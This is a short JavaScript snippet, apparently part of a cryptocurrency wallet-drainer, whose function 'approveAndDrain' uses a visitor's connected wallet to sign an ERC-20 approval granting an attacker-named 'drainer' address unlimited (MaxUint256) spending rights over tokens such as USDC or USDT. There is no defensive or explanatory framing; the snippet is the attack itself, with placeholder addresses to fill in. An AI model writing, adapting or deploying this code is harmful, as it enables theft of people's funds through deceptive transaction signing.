async function approveAndDrain() {
    const signer = window.web3.getSigner();
    const tokenAddress = "0x..."; // USDC, USDT, etc.
    const drainerAddress = "0xDrainerWallet";
  
    const tokenABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
  
    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
  
    const amount = ethers.constants.MaxUint256;
  
    const tx = await tokenContract.approve(drainerAddress, amount);
    console.log("Approval tx sent: ", tx.hash);
  }
  